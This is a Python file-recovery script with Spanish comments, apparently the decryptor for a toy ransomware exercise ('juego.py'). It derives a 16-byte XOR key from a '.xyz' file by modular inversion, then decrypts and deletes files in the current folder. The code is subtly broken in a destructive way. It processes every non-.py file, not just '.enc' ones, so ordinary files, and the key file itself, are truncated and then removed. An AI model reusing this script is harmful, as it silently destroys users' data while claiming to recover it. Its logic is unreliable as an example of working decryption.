from sympy import mod_inverse
from sys import argv,version_info
import os

def recupera(x):
    with open(x.replace('.enc',''),'wb') as z:
        z.write((lambda x:bytes([x[i]^k[i%16] for i in range(len(x))]))(open(x,'rb').read()))
    os.remove(x)

print("Recuperando archivos...")
# Leemos el archivo que creo juego.py
xyz = open('.xyz','rb')
xyz = xyz.read()
# Recuperamos los bloques de bytes que corresponden a c, d y k
c = xyz[0]
d = xyz[1:33]
k = xyz[33:len(xyz)]
# Los pasamos a números
c = int.from_bytes([c],'big')
d = int.from_bytes(d,'big')
k = int.from_bytes(k,'big')
# Recordemos que se hizo en el archivo juego.py
# k' = d*k%(1<<c) así que despejamos a k teniendo
# k = d^-1 * k' % (1<<x)
m = 1 << c
inv = mod_inverse(d,m)
k = inv*k%m
k = k.to_bytes(16,'big')
# Obtenemos los archivos de la carpeta actual
_,_,x = next(os.walk('./'))
# Obtenemos los archivos y los desciframos
x.remove(argv[0])
for archivo in x:
    if ".py" not in archivo:
        recupera(archivo)
print("Archivos recuperados")